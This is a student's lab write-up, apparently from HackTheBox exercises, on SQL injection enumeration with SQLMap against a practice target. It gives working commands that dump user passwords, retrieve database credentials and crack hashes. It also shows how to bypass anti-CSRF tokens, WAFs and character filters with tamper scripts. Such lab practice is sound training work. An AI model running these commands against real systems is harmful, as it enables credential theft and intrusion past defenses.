# SQLMap – Advanced Database Enumeration

## Objective

Practice advanced SQL injection enumeration techniques with SQLMap and retrieve specific information from a vulnerable database.

---

## Case #1 – Finding a Column Containing "style"

### Goal

Identify the name of the column containing the word **"style"**.

### Initial Approach

I first attempted to enumerate the whole database schema:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

Although this provided all databases, tables, and columns, the amount of information made it difficult to manually locate the desired column.

### Optimized Approach

Instead of searching manually, I used SQLMap's search feature to look for columns containing the keyword `style`:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C style --batch
```

### Result

SQLMap returned the column:

```
PARAMETER_STYLE
```

This solved the first challenge efficiently without having to inspect the entire schema manually.

---

## Case #2 – Retrieving Kimberly's Password

### Goal

Find the password associated with the user **Kimberly**.

### Step 1 – Identify the Database and Table

Since HTB labs commonly use the `testdb` database and a `users` table, I started by enumerating the table columns:

```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch
```

This revealed the relevant columns:

* `name`
* `password`

### Step 2 – Dump Only the Required Data

To avoid unnecessary output, I dumped only the `name` and `password` columns:

```bash
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
```

### Result

The output contained the credentials of all users, allowing me to identify Kimberly's password.

---

## Key Takeaways

* `--schema` provides a complete overview of the database structure, but can generate excessive output.
* `--search` is useful for quickly locating databases, tables, or columns based on keywords.
* `--columns` allows targeted enumeration of table structures.
* `--dump -C` makes data extraction more efficient by retrieving only specific columns.
* Limiting enumeration to the necessary information reduces noise and speeds up the process.

## Commands Used

```bash
# Enumerate schema
sqlmap -u "http://www.example.com/?id=1" --schema

# Search for columns containing "style"
sqlmap -u "http://www.example.com/?id=1" --search -C style --batch

# Enumerate columns in users table
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch

# Dump only name and password columns
sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump -C name,password --batch
```

## Skills Practiced

* SQL Injection Enumeration
* Database Schema Discovery
* Targeted Data Extraction
* SQLMap Automation
* Information Gathering
* Efficient Enumeration Techniques



SQLMap Fundamentals & Advanced Enumeration
Overview

In this module, I learned how to identify, exploit, and enumerate SQL Injection vulnerabilities using SQLMap. I explored basic and advanced database enumeration, password extraction and cracking, and several techniques used to bypass common web application protections.

Basic Enumeration
Database Enumeration

Used:

sqlmap -u URL --dbs

to enumerate available databases.

Table Enumeration

Used:

sqlmap -u URL -D DATABASE --tables

to list tables inside a database.

Column Enumeration

Used:

sqlmap -u URL -D DATABASE -T TABLE --columns

to identify column names and their types.

Dumping Data

Used:

sqlmap -u URL -D DATABASE -T TABLE --dump

to extract data from tables.

Advanced Enumeration
Schema Enumeration

Learned how to enumerate the complete database schema:

sqlmap -u URL --schema
Searching Databases, Tables and Columns

Used:

sqlmap -u URL --search -T user

to search for tables.

Used:

sqlmap -u URL --search -C pass

to search for columns containing specific keywords.

Password Enumeration and Hash Cracking

Learned how SQLMap automatically detects password hashes and performs dictionary attacks.

Used:

sqlmap -u URL -D DATABASE -T TABLE --dump

and allowed SQLMap to crack identified hashes.

Also learned to retrieve DBMS user credentials:

sqlmap -u URL --passwords
HTB Exercises
Case #1
Goal

Find:

Column containing "style"
Kimberly's password
Method

Instead of manually reviewing the schema output, used:

sqlmap -u URL --search -C style --batch

Found:

PARAMETER_STYLE

To retrieve Kimberly's password:

Enumerated columns:
sqlmap -u URL -D testdb -T users --columns
Found columns:
name
password
Dumped only relevant columns:
sqlmap -u URL -D testdb -T users --dump -C name,password
Case #8 – Anti-CSRF Token
Goal

Exploit SQLi in POST parameter id while handling anti-CSRF protection.

Learned

How SQLMap automatically refreshes tokens using:

--csrf-token

Used:

sqlmap -u URL \
--data="id=1&t0ken=value" \
--csrf-token=t0ken

Then enumerated and dumped the target table.

Case #9 – Unique Parameter
Goal

Exploit SQLi while handling a parameter that required unique values.

Learned

How to use:

--randomize

Used:

sqlmap -u URL?id=1&uid=value \
--randomize=uid

which generated a new uid value on every request.

Case #10 – Request Blocking
Goal

Understand why SQLMap couldn't detect the vulnerability.

Learned

How web applications may block automated requests.

Investigated output using verbosity and bypassed protections with:

--random-agent

Learned to recognize:

Empty responses
Non-dynamic parameters
WAF or bot protection
Case #11 – Character Filtering
Goal

Bypass filtering of < and > characters.

Learned

How SQLMap tamper scripts modify payloads.

Used:

--tamper=between

which replaces comparison operators with equivalent SQL expressions.

Protection Bypass Techniques Learned
Anti-CSRF Tokens
--csrf-token

Allows SQLMap to automatically update token values.

Random Parameters
--randomize

Generates unique values for parameters that must change every request.

Calculated Parameters
--eval

Executes Python code before sending requests to calculate parameter values.

Example:

h = MD5(id)
Tamper Scripts

Learned how to bypass WAFs and filters using tamper scripts.

Examples:

Tamper Script	Purpose
between	Bypass <, >, = filters
randomcase	Change keyword casing
space2comment	Replace spaces with comments
space2dash	Replace spaces with -- comments
equaltolike	Replace = with LIKE
versionedkeywords	Hide keywords inside MySQL comments
Key Concepts Learned
SQL Injection exploitation with SQLMap.
Database, table and column enumeration.
Schema enumeration.
Searching specific identifiers.
Password extraction and hash cracking.
Handling POST and GET injection points.
Anti-CSRF token bypass.
Unique parameter randomization.
Calculated parameter generation.
WAF and request filtering bypasses.
Tamper scripts.
Troubleshooting SQLMap output.
Building a systematic methodology instead of memorizing commands.
Main Takeaway

Through these exercises, I learned that successful SQL Injection exploitation is not about memorizing SQLMap commands, but understanding the protection mechanisms in place and choosing the appropriate technique to bypass them. I developed a repeatable workflow for reconnaissance, enumeration, exploitation, and data extraction while adapting to real-world defenses such as CSRF tokens, dynamic parameters, request filtering, and WAF protections.
